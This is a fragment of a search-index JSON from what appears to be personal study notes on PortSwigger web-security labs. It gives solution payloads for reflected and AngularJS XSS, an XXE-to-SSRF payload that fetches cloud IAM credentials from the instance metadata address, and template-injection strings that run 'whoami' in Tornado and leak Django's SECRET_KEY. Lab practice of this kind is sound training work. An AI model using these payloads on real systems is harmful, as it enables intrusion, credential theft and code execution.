"<pre><code>&lt;form action=/ method=GET&gt;\n    &lt;input type=text placeholder='Search the blog...' name=search value=\"pet\"&gt;\n    &lt;button type=submit class=button&gt;Search&lt;/button&gt;\n&lt;/form&gt;\n</code></pre> <p>Solution:</p> <p>Change the value of <code>search</code></p> <p><code>value=\"\"onmouseover=\"alert(1)\"</code></p> <p>Need to watch explanation of the following labs:</p>"}, {"location": "PortSwigger%20Labs/XSS/#lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event", "title": "Lab: DOM XSS in jQuery selector sink using a hashchange event", "text": ""}, {"location": "PortSwigger%20Labs/XSS/#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded", "title": "Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded", "text": ""}, {"location": "PortSwigger%20Labs/XSS/#dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded", "title": "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded", "text": "<p>Input:</p> <p>{{$on.constructor('alert(1)')()}}</p> <p>{{constructor.constructor('alert(1)')()}}</p>"}, {"location": "PortSwigger%20Labs/XXE%20injection/", "title": "XML external entity (XXE) injection", "text": "<p>XXE - XEE - XML External Entity | Hacktricks</p>"}, {"location": "PortSwigger%20Labs/XXE%20injection/#lab-exploiting-xxe-to-perform-ssrf-attacks", "title": "Lab: Exploiting XXE to perform SSRF attacks", "text": "<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"&gt; ]&gt;\n\n&lt;stockCheck&gt;\n    &lt;productId&gt;\n        &amp;xxe;\n    &lt;/productId&gt;\n    &lt;storeId&gt;3&lt;/storeId&gt;\n&lt;/stockCheck&gt;\n</code></pre>"}, {"location": "PortSwigger%20Labs/server-side%20template%20injection/", "title": "Sever-side template injection", "text": "<pre><code>&lt;!-- Tornado template --&gt;\nblog-post-author-display=user.name}}{% import os %}{{os.system('whoami')\n\n&lt;!-- Django template --&gt;\n{{settings.SECRET_KEY}}\n</code></pre>"}]}